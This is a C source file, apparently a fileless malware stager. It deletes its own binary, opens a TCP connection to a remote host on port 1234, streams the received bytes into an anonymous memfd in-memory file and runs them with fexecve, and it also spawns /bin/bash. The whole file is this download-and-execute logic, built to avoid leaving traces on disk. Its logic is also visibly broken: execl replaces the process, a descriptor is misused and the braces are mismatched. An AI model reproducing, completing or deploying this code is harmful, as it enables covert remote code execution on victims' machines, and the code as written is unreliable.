#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#define BUFF_SIZE 1024

int memfd_create(const char *name, unsigned int flags);

void usage(char* prog)
{
    char *use = "USAGE: %1$s Destination Port ...\n";
    printf(use, prog);
}

void die(char* msg)
{
    printf("[ - ] %s\n", msg);
    printf("[ ? ] %s", strerror(errno));
    exit(errno);
}


int main(int argc, char* argv[], char* envp[])
{
    int fd1;
    char buff1[BUFF_SIZE] = {0};
    char buff2[BUFF_SIZE] = {0};

    if (argc < 2) {
        usage(argv[0]);
        exit(1);
    }
    
    fd1 = memfd_create("test", 0);
    if (fd1 < 0) 
    	die("Can't create memfd file");


    remove(argv[0]);
    
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(argv[1]);
    sa.sin_port = htons(1234);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    
    int fd2=execl("/bin/bash", "/bin/bash", (char *)NULL);

    printf("\n ----------------------------------- \n");
    int i = 0, j = 0;
    int read_count = 0, write_count = 0;
    while( (read_count = read(s, buff1, BUFF_SIZE)) != 0 ) {
        if( (write_count = write(fd1, buff1, read_count)) == -1)
            die("Failed to write to mem file");

        i += read_count;
        j += write_count;
        printf("\rRead count = %6d  |  Write count = %3d", i, j);
        
        fexecve(fd1, argv, envp);
    }
    printf("\n ----------------------------------- \n");
    
    printf("\n Spawning shell \n");
    int read_count2 = 0, write_count2 = 0;
    while( (read_count = read(fd2, buff2, BUFF_SIZE)) != 0 ) {
        if( (write_count = write(fd1, buff2, read_count)) == -1)
            die("Failed to write to mem file");
    
    

    printf("[ + ] Starting execution...\n");

    //char* const args[] = {NULL};  
    //int args=execve("bin/sh",0,0);
    
    //fexecve(fd1, argv, envp);

    printf("Failed Executing....\n");

    return errno;
}
}
